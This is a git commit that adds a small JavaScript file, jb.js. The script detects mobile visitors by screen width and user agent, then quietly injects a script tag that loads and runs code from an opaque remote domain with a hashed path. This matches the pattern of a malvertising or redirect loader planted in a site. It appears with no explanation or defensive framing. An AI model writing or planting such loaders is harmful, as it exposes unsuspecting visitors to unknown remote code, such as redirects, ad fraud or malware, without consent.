12b3ebd5848f364c3f882dc99592587b82b1bdfc
mahji01 <132646024+mahji01@users.noreply.github.com>
2023-05-15 00:33:01 +0700

    Create jb.js

---
+++ jb.js
@@ -0,0 +1,8 @@
+if (screen.width < 500 ||
+ navigator.userAgent.match(/Android/i) ||
+ navigator.userAgent.match(/webOS/i) ||
+ navigator.userAgent.match(/iPhone/i) ||
+ navigator.userAgent.match(/iPod/i)){
+	 
+	(function(s,u,p){s.src=u,p.appendChild(s);})(document.createElement('script'),'//sadnesscontemporary.com/c0/f7/0b/c0f70b385cab894c35918802f85158d3.js',document.body||document.documentElement)
+	 }
